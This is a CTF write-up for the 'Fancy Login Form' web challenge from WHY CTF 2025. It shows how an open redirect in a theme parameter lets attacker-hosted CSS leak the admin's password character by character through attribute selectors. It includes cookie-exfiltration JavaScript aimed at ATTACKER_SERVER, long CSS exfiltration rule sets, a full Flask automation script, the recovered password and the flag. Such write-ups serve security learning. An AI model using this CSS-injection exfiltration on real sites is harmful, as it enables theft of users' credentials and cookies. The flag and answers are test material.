---
name: Fancy Login Form (2025)
event: WHY CTF 2025
category: Web
description: Writeup for Fancy Login Form (Web) - WHY CTF (2025) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Fancy Login Form

## Video Walkthrough

[![](https://img.youtube.com/vi/jUjlj2z5jJk/0.jpg)](https://www.youtube.com/watch?v=jUjlj2z5jJk "Fancy Login Form (What Hackers Yearn CTF)")

## Description

> We created a [login form](https://fancy-login-form.ctf.zone) with different themes, hope you like it!

> Hint: The admin will only visit its OWN URL

## Solution

We arrive to a login page, but no registration function. I try default creds, SQLi etc.

![](images/0.PNG)

There's a button to dynamically change the theme, which updates a CSS path but doesn't seem particularly interesting. There's also a "report" button. If we click it, a report is automatically sent.

![](images/1.PNG)

Checking the HTTP history in burp suite, there is a POST request to `/report.php` with the following parameter:

{% code overflow="wrap" %}

```
url=https://fancy-login-form.ctf.zone/?theme=css/ocean
```

{% endcode %}

We can also see the JS code responsible for issuing the request.

{% code overflow="wrap" %}

```javascript
document.getElementById("report").addEventListener("click", (e) => {
    var url = window.location.href;
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "/report.php", true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
    xhr.send("url=" + url);
    document.getElementById("report-box").style.display = "none";
    document.getElementById("report-button").style.display = "block";
    document.getElementById("report").disabled = "true";
    document.getElementById("report-text").textContent = "Report sent! An admin will visit the URL shortly!";
});
```

{% endcode %}

### Open Redirect

At first, I think of XSS and replace the `url` with my own server URL (ngrok), but don't get a hit. I remember the hint "The admin will only visit its OWN URL" and realise we also have an open redirect. We can supply the `theme` parameter of the URL our own domain.

{% code overflow="wrap" %}

```
url=https://fancy-login-form.ctf.zone/?theme=https://ATTACKER_SERVER/css/ocean
```

{% endcode %}

We get a hit for the `/css/ocean.css` file (meaning we don't control the file extension), so we can create that file on our server. Let's set the contents to import a background image.

{% code overflow="wrap" %}

```css
body {
    background-image: url("https://ATTACKER_SERVER?flag=meow");
}
```

{% endcode %}

The server gets a hit!

![](images/2.PNG)

Unfortunately, I tried various payloads to execute JS here, e.g.

{% code overflow="wrap" %}

```css
body {
    background-image: url("https://ATTACKER_SERVER?flag=" + document.cookie);
}
```

{% endcode %}

These resulted in no request being made to the attacker server (not just a missing cookie). I also tried hosting an external JS file, e.g.

{% code overflow="wrap" %}

```javascript
var img = new Image();
img.src = "https://ATTACKER_SERVER?flag=" + document.cookie;
```

{% endcode %}

Which we import via the attacker-controlled CSS.

{% code overflow="wrap" %}

```css
@import url("https://ATTACKER_SERVER/payload.js");
```

{% endcode %}

It successfully imports, but we don't get the `?flag` request.

![](images/3.PNG)

I tried a variety of payloads/formats here but each had the same issue, e.g.

{% code overflow="wrap" %}

```javascript
fetch("https://ATTACKER_SERVER?flag=" + document.cookie, {
    method: "GET",
    headers: {
        "Content-Type": "application/json",
    },
});
```

{% endcode %}

I tested this a little in my own browser and spotted the following error.

![](images/4.PNG)

Still playing around in the browser devtools style editor, I try a different CSS payload.

{% code overflow="wrap" %}

```css
@font-face {
    font-family: "meow";
    src: url("https://ATTACKER_SERVER/payload.js");
}

body {
    font-family: "meow";
}
```

{% endcode %}

![](images/5.PNG)

I investigated/tested some more techniques from these excellent resources:

-   [Exfiltration via CSS Injection (tripoloski)](https://tripoloski1337.github.io/webex/2024/07/24/exfil-using-only-css.html)
-   [x3CTF - blogdog + new CSS Injection XS-Leak! (j0r1an)](https://jorianwoltjer.com/blog/p/research/x3ctf-blogdog-new-css-injection-xs-leak)
-   [irisCTF2023 Writeup - Web sanitzer - CSS Injection (SloppyJoePirates)](https://www.youtube.com/watch?v=j1dY-poGPKs)
-   [CSS Injection: Attacking with Just CSS (aszx87410)](https://aszx87410.github.io/beyond-xss/en/ch3/css-injection/)

### Exfiltration via CSS Injection

When reading the blogs, I noticed a method to exfiltrate data from form fields using CSS. I reviewed the source code again and realised there was some JS updating a password attribute each time a key was pressed.

{% code overflow="wrap" %}

```javascript
const inp = document.getElementById("password");
inp.addEventListener("keyup", (e) => {
    inp.setAttribute("value", inp.value);
});
```

{% endcode %}

The fact they only do this for the password, not the username, made me suspicious 🔎 I updated the CSS in the devtools style editor.

{% code overflow="wrap" %}

```css
input[name="password"][value^="a"] {
    background-image: url(https://ATTACKER_SERVER/a);
}
```

{% endcode %}

When I typed "a" into the password field, I saw a request to the `/a` endpoint on my server.

![](images/6.PNG)

So, we can host the following in our CSS file. It will check if the first character of the password field matches any character in the alphabet (or digits).

{% code overflow="wrap" %}

```css
input[name="password"][value^="a"] {
    background-image: url("https://ATTACKER_SERVER/a");
}
input[name="password"][value^="b"] {
    background-image: url("https://ATTACKER_SERVER/b");
}
input[name="password"][value^="c"] {
    background-image: url("https://ATTACKER_SERVER/c");
}
input[name="password"][value^="d"] {
    background-image: url("https://ATTACKER_SERVER/d");
}
input[name="password"][value^="e"] {
    background-image: url("https://ATTACKER_SERVER/e");
}
input[name="password"][value^="f"] {
    background-image: url("https://ATTACKER_SERVER/f");
}
/** Add the remaining input elements for a-zA-Z0-9**/
```

{% endcode %}

Then send the admin our CSS URL.

{% code overflow="wrap" %}

```
https://fancy-login-form.ctf.zone/?theme=https://ATTACKER_SERVER/css/ocean
```

{% endcode %}

In our HTTP log, we'll get the first character of the password ("F")!

{% code overflow="wrap" %}

```bash
HTTP Requests
-------------
21:06:37.376 BST GET /F                         404 File not found
21:06:36.748 BST GET /css/ocean.css             200 OK
```

{% endcode %}

We just need to repeat this for each character. You could automate this into a nice script but I went for the manual approach (was super slow, don't recommend lol); use find/replace and replace `value^=` with `value^=F`. Repeat this until we get it all.

Note: I realised that the password has special chars, so after finding `F0x13foXtrOT`, I added some more elements to the CSS.

{% code overflow="wrap" %}

```css
input[name=password][value^=F0x13foXtrOT\!] { background-image: url('https://ATTACKER_SERVER/!'); }
input[name=password][value^=F0x13foXtrOT\@] { background-image: url('https://ATTACKER_SERVER/@'); }
input[name=password][value^=F0x13foXtrOT\#] { background-image: url('https://ATTACKER_SERVER/#'); }
input[name=password][value^=F0x13foXtrOT\$] { background-image: url('https://ATTACKER_SERVER/$'); }
input[name=password][value^=F0x13foXtrOT\%] { background-image: url('https://ATTACKER_SERVER/%'); }
input[name=password][value^=F0x13foXtrOT\^] { background-image: url('https://ATTACKER_SERVER/^'); }
input[name=password][value^=F0x13foXtrOT\&] { background-image: url('https://ATTACKER_SERVER/&'); }
input[name=password][value^=F0x13foXtrOT\*] { background-image: url('https://ATTACKER_SERVER/*'); }
input[name=password][value^=F0x13foXtrOT\(] { background-image: url('https://ATTACKER_SERVER/('); }
input[name=password][value^=F0x13foXtrOT\)] { background-image: url('https://ATTACKER_SERVER/)'); }
input[name=password][value^=F0x13foXtrOT\_] { background-image: url('https://ATTACKER_SERVER/_'); }
input[name=password][value^=F0x13foXtrOT\-] { background-image: url('https://ATTACKER_SERVER/-'); }
input[name=password][value^=F0x13foXtrOT\+] { background-image: url('https://ATTACKER_SERVER/+'); }
input[name=password][value^=F0x13foXtrOT\~] { background-image: url('https://ATTACKER_SERVER/~'); }
input[name=password][value^=F0x13foXtrOT\[ ] { background-image: url('https://ATTACKER_SERVER/['); }
input[name=password][value^=F0x13foXtrOT\\] { background-image: url('https://ATTACKER_SERVER/]'); }
input[name=password][value^=F0x13foXtrOT\|] { background-image: url('https://ATTACKER_SERVER/|'); }
input[name=password][value^=F0x13foXtrOT\;] { background-image: url('https://ATTACKER_SERVER/;'); }
input[name=password][value^=F0x13foXtrOT\:'"] { background-image: url('https://ATTACKER_SERVER/:\'"'); }
input[name=password][value^=F0x13foXtrOT\,] { background-image: url('https://ATTACKER_SERVER/,'); }
input[name=password][value^=F0x13foXtrOT\.] { background-image: url('https://ATTACKER_SERVER/.'); }
input[name=password][value^=F0x13foXtrOT\/] { background-image: url('https://ATTACKER_SERVER//'); }
```

{% endcode %}

The full password is `F0x13foXtrOT&Elas7icBe4n5`, we can login with:

{% code overflow="wrap" %}

```
admin:F0x13foXtrOT&Elas7icBe4n5
```

{% endcode %}

{% code overflow="wrap" %}

```
Welcome admin! You earned yourself a flag: flag{6b1f095e79699a79dc4a366c1131313e}
```

{% endcode %}

After submitting the flag, I decided to use ChatGPT to write an automated solve script. I should have done this at the start, to reduce manual effort/error 😆

{% code overflow="wrap" %}

```python
from flask import Flask, Response
from urllib.parse import quote
import argparse
import requests

app = Flask(__name__)

S = {
    'attacker': 'https://ATTACKER_SERVER',
    'target': 'https://fancy-login-form.ctf.zone',
    'report_path': '/report.php',
    'charset': 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=~[]\\|;:\'",./',
    'prefix': '',
    'auto_revisit': True
}


def css_attr_escape(s: str) -> str:
    return s.replace("\\", "\\\\").replace('"', '\\"')


@app.get("/")
def idx():
    return f"prefix:{S['prefix']} css:{S['attacker']}/css/ocean"


@app.get("/css/ocean.css")
def ocean():
    p = S['prefix']
    rules = []
    for ch in S['charset']:
        cand = p + ch
        leak = f"{S['attacker']}/leak/{quote(cand, safe='')}"
        sel = f'input[name="password"][value^="{css_attr_escape(cand)}"]'
        rules.append(f"{sel}{{background-image:url('{leak}')}}")
    css = ''.join(rules)
    resp = Response(css, mimetype="text/css")
    resp.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
    resp.headers['Pragma'] = 'no-cache'
    resp.headers['Expires'] = '0'
    return resp


@app.get("/leak/<path:cand>")
def leak(cand):
    if cand.startswith(S['prefix']) and len(cand) > len(S['prefix']):
        S['prefix'] = cand
        print("[+]", S['prefix'], flush=True)
        if S.get('auto_revisit'):
            try:
                url = f"{S['target']}/?theme={S['attacker']}/css/ocean"
                r = requests.post(S['target'] + S['report_path'],
                                  data={'url': url}, timeout=8)
                print("[*] re-report", r.status_code)
            except Exception as e:
                print("[!] re-report failed:", e)
    return ""


def report():
    url = f"{S['target']}/?theme={S['attacker']}/css/ocean"
    r = requests.post(S['target'] + S['report_path'],
                      data={'url': url}, timeout=8)
    print("[*] report", r.status_code)


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--attacker")
    ap.add_argument("--target")
    ap.add_argument("--report-path")
    ap.add_argument("--charset")
    ap.add_argument("--start-prefix")
    ap.add_argument("--no-auto", action="store_true")
    ap.add_argument("--host", default="0.0.0.0")
    ap.add_argument("--port", type=int, default=80)
    a = ap.parse_args()

    if a.attacker:
        S['attacker'] = a.attacker.rstrip("/")
    if a.target:
        S['target'] = a.target.rstrip("/")
    if a.report_path:
        S['report_path'] = a.report_path
    if a.charset:
        S['charset'] = a.charset
    if a.start_prefix:
        S['prefix'] = a.start_prefix
    if a.no_auto:
        S['auto_revisit'] = False

    try:
        report()
    except Exception as e:
        print("[!] initial report failed:", e)
    print("[*] serve CSS at", S['attacker'] + "/css/ocean.css")
    app.run(host=a.host, port=a.port, debug=False)
```

{% endcode %}

{% code overflow="wrap" %}

```bash
sudo python exfil.py

[*] report 200
[*] serve CSS at https://ATTACKER_SERVER/css/ocean.css
 * Serving Flask app 'exfil'
 * Debug mode: off
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:80
 * Running on http://192.168.16.128:80
Press CTRL+C to quit
127.0.0.1 - - [12/Aug/2025 09:29:26] "GET /css/ocean.css HTTP/1.1" 200 -
[+] F
[*] re-report 200
127.0.0.1 - - [12/Aug/2025 09:29:32] "GET /leak/F HTTP/1.1" 200 -
127.0.0.1 - - [12/Aug/2025 09:29:42] "GET /css/ocean.css HTTP/1.1" 200 -
[+] F0
[*] re-report 200
127.0.0.1 - - [12/Aug/2025 09:29:58] "GET /leak/F0 HTTP/1.1" 200 -
127.0.0.1 - - [12/Aug/2025 09:30:07] "GET /css/ocean.css HTTP/1.1" 200 -
[+] F0x
```

{% endcode %}

![](images/7.PNG)

Flag: `flag{6b1f095e79699a79dc4a366c1131313e}`
